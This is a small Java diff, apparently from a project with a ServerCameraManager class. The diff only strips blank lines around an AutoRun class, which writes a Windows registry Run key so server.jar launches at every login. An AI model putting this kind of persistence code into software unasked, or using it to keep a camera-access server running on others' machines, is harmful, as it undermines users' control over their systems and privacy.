@@ -559,7 +559,6 @@ class ServerCameraManager {
 class AutoRun{
     static String name= null;
     static String path= null;
-
     public AutoRun() throws IOException{
         System.out.println("将加本文件加入自启动："+"server.jar");
         name="server.jar";
@@ -569,5 +568,4 @@ class AutoRun{
         String regKey = "\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"";
         Runtime.getRuntime().exec("reg "+"add "+regKey+" /v "+name+" /t reg_sz /d "+path);
     }
-
 }
